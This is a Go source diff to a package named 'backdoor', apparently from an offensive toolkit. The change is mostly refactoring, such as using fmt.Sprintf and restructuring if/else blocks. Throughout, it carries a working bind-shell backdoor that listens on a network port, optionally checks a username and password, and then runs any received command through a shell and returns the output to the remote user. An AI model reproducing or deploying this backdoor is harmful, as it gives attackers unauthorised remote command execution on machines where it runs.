@@ -1,6 +1,7 @@
 package backdoor
 
 import (
+	"fmt"
 	"net"
 	"strings"
 
@@ -48,11 +49,10 @@ func Set_password(password string) {
 
 func Set_protocol(new_proto string) {
 	if new_proto != "tcp" && new_proto != "udp" {
-		notify.Error("Unknown network protocol '"+new_proto+"'", "backdoor.Set_protocol")
-		return
+		notify.Error(fmt.Sprintf("Unknown network protocol '%s'", new_proto), "backdoor.Set_protocol")
+	} else {
+		c_back.protocol = new_proto
 	}
-
-	c_back.protocol = new_proto
 }
 
 func Set_welcome_msg(new_msg string) {
@@ -83,12 +83,12 @@ func Start() {
 	if c_back.read_size == 0 {
 		Set_read_size("1024")
 	}
-	conn, err := net.Listen(c_back.protocol, c_back.ip+":"+c_back.port)
+	conn, err := net.Listen(c_back.protocol, fmt.Sprintf("%s:%s", c_back.ip, c_back.port))
 	if err != nil {
 		notify.Error(err.Error(), "backdoor.Start()")
-		return
+	} else {
+		c_back.conn = conn
 	}
-	c_back.conn = conn
 }
 
 func Close() {
@@ -113,81 +113,82 @@ func Serve() {
 		active_conn.Close() // Closes the connection
 		Close()
 		notify.Error(err.Error(), "backdoor.serve()")
-		return
-	}
-	if c_back.login { // We must authenticate the user
-		for { // We will exit ony once a login is correct
-			read := make([]byte, c_back.read_size)
-			var user, pass string
+	} else {
+		if c_back.login { // We must authenticate the user
+			for { // We will exit ony once a login is correct
+				read := make([]byte, c_back.read_size)
+				var user, pass string
 
-			active_conn.Write([]byte("[1] Username: "))
-			active_conn.Read(read) // Read the username
-			if read[0] == 0 {
-				//Serve() // Reset the connection
-				return
-			}
-			user = extract_login_credentials(read)
+				active_conn.Write([]byte("[1] Username: "))
+				active_conn.Read(read) // Read the username
+				if read[0] == 0 {
+					//Serve() // Reset the connection
+					return
+				}
+				user = extract_login_credentials(read)
 
-			active_conn.Write([]byte("[2] Password: "))
-			active_conn.Read(read) // Read the password
-			pass = extract_login_credentials(read)
+				active_conn.Write([]byte("[2] Password: "))
+				active_conn.Read(read) // Read the password
+				pass = extract_login_credentials(read)
 
-			// Hash the username and password
-			attack_vector.Set_hash(c_back.hashing_algorithm)
-			user = attack_vector.Hash(user)
-			pass = attack_vector.Hash(pass)
+				// Hash the username and password
+				attack_vector.Set_hash(c_back.hashing_algorithm)
+				user = attack_vector.Hash(user)
+				pass = attack_vector.Hash(pass)
 
-			if user != c_back.username || pass != c_back.password {
-				active_conn.Write([]byte("[!] Invalid username and/or password\n"))
-			} else { // The provided info was correct
-				break
-			}
-		}
-	}
-
-	active_conn.Write([]byte(c_back.welcome_msg)) // Welcome the user
-	for {                                         // A user connected
-		active_conn.Write([]byte(">> "))
-		read_data := make([]byte, c_back.read_size)
-		active_conn.Read(read_data)
-		if read_data[0] == 0 { // The user disconnected so exit this function
-			return
-		}
-
-		var command string
-		var args string
-		var first_space bool // First space splits the command and the arguments
-		// This portion reads the read data and splits it up to what it belives is the command and the command args (if there is any)
-		for _, c := range read_data {
-			if c == 0 || c == 10 { // 0 = empty data, 10 = New line
-				break
-			}
-			if c == 32 && !first_space { // 32 = Space
-				first_space = true
-			} else {
-				if !first_space {
-					command += string(c)
-				} else {
-					args += string(c)
+				if user != c_back.username || pass != c_back.password {
+					active_conn.Write([]byte("[!] Invalid username and/or password\n"))
+				} else { // The provided info was correct
+					break
 				}
 			}
 		}
-		var toReturn []byte
-		if command == "" { // Nothing was most likely entered
-			toReturn = append(toReturn, []byte("No command was entered\n")...)
-		} else {
-			var resp subprocess.Response
-			if args != "" {
-				resp = subprocess.RunShell("", "", strings.Split(command+" "+args, " ")...)
-			} else {
-				resp = subprocess.RunShell("", "", command)
+
+		active_conn.Write([]byte(c_back.welcome_msg)) // Welcome the user
+		for {                                         // A user connected
+			active_conn.Write([]byte(">> "))
+			read_data := make([]byte, c_back.read_size)
+			active_conn.Read(read_data)
+			if read_data[0] == 0 { // The user disconnected so exit this function
+				return
 			}
-			if resp.StdErr != "" {
-				toReturn = []byte(resp.StdErr)
-			} else {
-				toReturn = []byte(resp.StdOut)
+
+			var command string
+			var args string
+			var first_space bool // First space splits the command and the arguments
+			// This portion reads the read data and splits it up to what it belives is the command and the command args (if there is any)
+			for _, c := range read_data {
+				if c == 0 || c == 10 { // 0 = empty data, 10 = New line
+					break
+				}
+				if c == 32 && !first_space { // 32 = Space
+					first_space = true
+				} else {
+					if !first_space {
+						command += string(c)
+					} else {
+						args += string(c)
+					}
+				}
 			}
+			var toReturn []byte
+			if command == "" { // Nothing was most likely entered
+				toReturn = append(toReturn, []byte("No command was entered\n")...)
+			} else {
+				var resp subprocess.Response
+				if args != "" {
+					resp = subprocess.RunShell("", "", strings.Split(command+" "+args, " ")...)
+				} else {
+					resp = subprocess.RunShell("", "", command)
+				}
+				if resp.StdErr != "" {
+					toReturn = []byte(resp.StdErr)
+				} else {
+					toReturn = []byte(resp.StdOut)
+				}
+			}
+			active_conn.Write([]byte(toReturn)) // Send the output back to the user
 		}
-		active_conn.Write([]byte(toReturn)) // Send the output back to the user
 	}
+
 }
